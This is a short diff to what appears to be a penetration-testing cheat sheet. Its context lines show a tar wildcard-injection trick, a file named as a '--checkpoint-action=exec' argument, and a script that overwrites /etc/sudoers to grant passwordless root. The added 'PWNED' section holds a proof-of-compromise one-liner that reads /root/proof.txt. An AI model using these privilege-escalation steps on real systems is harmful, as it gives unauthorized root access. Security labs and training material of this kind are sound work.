@@ -733,3 +733,9 @@ echo "" > '--checkpoint-action=exec=sh privesc.sh'
 #malicous.sh:
 echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
 ```
+
+#### PWNED
+
+```bash
+echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
+```
